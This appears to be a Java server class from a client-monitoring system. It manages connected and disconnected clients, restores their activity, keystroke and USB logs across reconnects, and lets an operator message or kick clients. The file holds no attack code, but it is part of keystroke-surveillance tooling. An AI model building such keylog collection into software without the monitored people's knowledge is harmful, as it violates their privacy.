package com.acs;

import java.util.*;
import java.util.concurrent.ConcurrentHashMap;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.TimeUnit;

public class ConnectionManager {

    // Active connections — keyed by ip:port
    private static final Map<String, ClientHandler> connectedClients    = new ConcurrentHashMap<>();

    // Disconnected clients — keyed by ip only so reconnect matching works
    private static final Map<String, ClientHandler> disconnectedClients = new ConcurrentHashMap<>();

    private static final Object lock = new Object();

    // ── UI Listener ───────────────────────────────────────────────────────────
    private static volatile ConnectionListener uiListener = null;

    public static void setListener(ConnectionListener listener) {
        uiListener = listener;
    }

    // ─────────────────────────────────────────────────────────────────────────

    /**
     * Add a new client to the connection pool.
     * If a disconnected client with the same IP exists:
     *   - Restores activity log and keylog to the new handler
     *   - Writes a reconnect marker into the still-open session log files
     *     so the log is readable across the gap
     */
    public static void addClient(String clientId, ClientHandler handler) {
        String ip = handler.getClientIp();

        synchronized (lock) {
            ClientHandler previous = disconnectedClients.remove(ip);
            if (previous != null) {
                // Normal reconnect — same JVM session, restore in-memory logs
                handler.restoreActivityLog(previous.getActivityLog());
                handler.restoreKeylogLog(previous.getKeylogLog());
                handler.restoreUsbLog(previous.getUsbLog());

                System.out.println("[ConnectionManager] Reconnect detected for IP " + ip
                        + " — logs restored (activity: " + previous.getActivityLog().size()
                        + ", keylog: " + previous.getKeylogLog().size()
                        + ", usb: " + previous.getUsbLog().size() + " entries)");

                SessionManager.writeReconnectMarker(ip);

            } else if (SessionManager.isSessionActive() && SessionManager.getSessionDir() != null) {
                // Check disk — server may have crashed and restarted
                // If client IP folder exists in session dir → was part of crashed session
                java.nio.file.Path clientFolder =
                        SessionManager.getSessionDir().resolve(ip);
                if (java.nio.file.Files.exists(clientFolder)) {
                    System.out.println("[ConnectionManager] Server-crash reconnect detected for IP "
                            + ip + " — folder exists on disk, writing reconnect marker");
                    SessionManager.writeReconnectMarker(ip);
                }
            }

            connectedClients.put(clientId, handler);
            System.out.println("[ConnectionManager] Client added: " + clientId
                    + " | Total: " + connectedClients.size());
        }

        if (uiListener != null) uiListener.onClientConnected(clientId);
    }

    /**
     * Called by ClientHandler.disconnect() — moves client to disconnected map.
     * Card stays visible on the dashboard showing DISCONNECTED state + timestamp.
     */
    public static void markDisconnected(String clientId, ClientHandler handler) {
        String ip = handler.getClientIp();

        synchronized (lock) {
            connectedClients.remove(clientId);
            disconnectedClients.put(ip, handler);
            System.out.println("[ConnectionManager] Client disconnected: " + clientId
                    + " | Active: " + connectedClients.size()
                    + " | Disconnected: " + disconnectedClients.size());
        }

        if (uiListener != null) uiListener.onClientDisconnected(clientId);
    }

    /**
     * Fully removes a disconnected client from the server.
     * Called when the operator clicks "Remove" on a disconnected client's dialog.
     */
    public static void removeDisconnectedClient(String clientIp) {
        synchronized (lock) {
            disconnectedClients.remove(clientIp);
            System.out.println("[ConnectionManager] Disconnected client removed: " + clientIp);
        }
        if (uiListener != null) uiListener.onDisconnectedClientRemoved(clientIp);
    }

    /**
     * Hard-removes a client from the active pool without moving to disconnected.
     * Used by disconnectAll() only.
     */
    public static void removeClient(String clientId) {
        synchronized (lock) {
            connectedClients.remove(clientId);
        }
    }

    // ── Queries ───────────────────────────────────────────────────────────────

    public static ClientHandler getClient(String clientId) {
        return connectedClients.get(clientId);
    }

    public static ClientHandler getDisconnectedClient(String clientIp) {
        return disconnectedClients.get(clientIp);
    }

    public static Map<String, ClientHandler> getAllClientsForDisplay() {
        Map<String, ClientHandler> all = new HashMap<>();
        synchronized (lock) {
            all.putAll(connectedClients);
            for (Map.Entry<String, ClientHandler> e : disconnectedClients.entrySet()) {
                all.put(e.getValue().getClientId(), e.getValue());
            }
        }
        return all;
    }

    public static Map<String, ClientHandler> getAllClients() {
        return new HashMap<>(connectedClients);
    }

    public static Map<String, ClientHandler> getDisconnectedClients() {
        return new HashMap<>(disconnectedClients);
    }

    public static boolean sendMessageToClient(String clientId, String message) {
        ClientHandler handler = getClient(clientId);
        if (handler != null && handler.isClientAlive()) {
            handler.sendMessage(message);
            return true;
        }
        return false;
    }

    public static void broadcastMessage(String message) {
        synchronized (lock) {
            for (ClientHandler handler : connectedClients.values()) {
                if (handler.isClientAlive()) handler.sendMessage(message);
            }
        }
    }

    public static List<String> getConnectedClientIPs() {
        synchronized (lock) {
            return new ArrayList<>(connectedClients.keySet());
        }
    }

    public static int getClientCount() {
        return connectedClients.size();
    }

    public static boolean isClientConnected(String clientId) {
        ClientHandler handler = getClient(clientId);
        return handler != null && handler.isClientAlive();
    }

    public static void displayAllClients() {
        synchronized (lock) {
            System.out.println("\n======================================");
            System.out.println("Connected (" + connectedClients.size() + "):");
            connectedClients.values().forEach(h ->
                    System.out.println("  + " + h.getClientInfo()));
            System.out.println("Disconnected (" + disconnectedClients.size() + "):");
            disconnectedClients.values().forEach(h ->
                    System.out.println("  - " + h.getClientId()
                            + " (at " + h.getDisconnectTimestamp() + ")"));
            System.out.println("======================================\n");
        }
    }

    public static void disconnectAll() {
        List<ClientHandler> handlers;
        synchronized (lock) {
            handlers = new ArrayList<>(connectedClients.values());
            connectedClients.clear();
        }

        if (handlers.isEmpty()) {
            System.out.println("[ConnectionManager] No clients to disconnect");
            return;
        }

        ExecutorService executor = Executors.newFixedThreadPool(
                Math.min(handlers.size(), 20));
        for (ClientHandler handler : handlers) {
            executor.submit(() -> {
                try { handler.kickAndDisconnect(); }
                catch (Exception e) {
                    System.out.println("[ConnectionManager] Error disconnecting: "
                            + e.getMessage());
                }
            });
        }

        executor.shutdown();
        try {
            if (!executor.awaitTermination(10, TimeUnit.SECONDS)) {
                executor.shutdownNow();
            }
        } catch (InterruptedException e) {
            executor.shutdownNow();
            Thread.currentThread().interrupt();
        }
        System.out.println("[ConnectionManager] All clients disconnected");
    }
}